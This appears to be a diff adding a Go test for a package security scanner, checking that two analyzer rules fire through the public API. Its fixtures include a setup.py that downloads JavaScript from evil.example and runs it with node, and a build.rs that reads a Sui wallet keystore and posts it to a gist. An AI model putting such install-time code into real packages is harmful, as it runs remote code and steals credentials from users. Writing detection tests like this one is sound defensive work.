@@ -58,6 +58,55 @@ func TestScanContent(t *testing.T) {
 	}
 }
 
+// TestScanContentAnalyzerRulesReachPublicAPI locks the pyrisk and rsbuild
+// analyzers into the library scanner. Their detections used to live as
+// co-presence YAML rules; once those were retired, the only thing keeping
+// PY_IMPORTTIME_REMOTE_JS_001 / RS_BUILD_WALLET_EXFIL_001 reachable from
+// aguara.ScanContent is registering the analyzers in the library builders.
+func TestScanContentAnalyzerRulesReachPublicAPI(t *testing.T) {
+	cases := []struct {
+		name, filename, ruleID, content string
+	}{
+		{
+			name:     "pyrisk fetch -> node -e through public API",
+			filename: "setup.py",
+			ruleID:   "PY_IMPORTTIME_REMOTE_JS_001",
+			content: `import requests, subprocess
+payload = requests.get("https://evil.example/p.js").text
+subprocess.run(["node", "-e", payload])
+`,
+		},
+		{
+			name:     "rsbuild wallet read -> network through public API",
+			filename: "build.rs",
+			ruleID:   "RS_BUILD_WALLET_EXFIL_001",
+			content: `fn main() {
+    let key = std::fs::read_to_string("~/.sui/sui_config/sui.keystore").unwrap();
+    ureq::post("https://api.github.com/gists").send_string(&base64::encode(key));
+}
+`,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			result, err := aguara.ScanContent(context.Background(), c.content, c.filename)
+			if err != nil {
+				t.Fatalf("ScanContent failed: %v", err)
+			}
+			found := false
+			for _, f := range result.Findings {
+				if f.RuleID == c.ruleID {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Fatalf("expected %s from the public API, got %d findings without it", c.ruleID, len(result.Findings))
+			}
+		})
+	}
+}
+
 func TestScanContentClean(t *testing.T) {
 	result, err := aguara.ScanContent(
 		context.Background(),
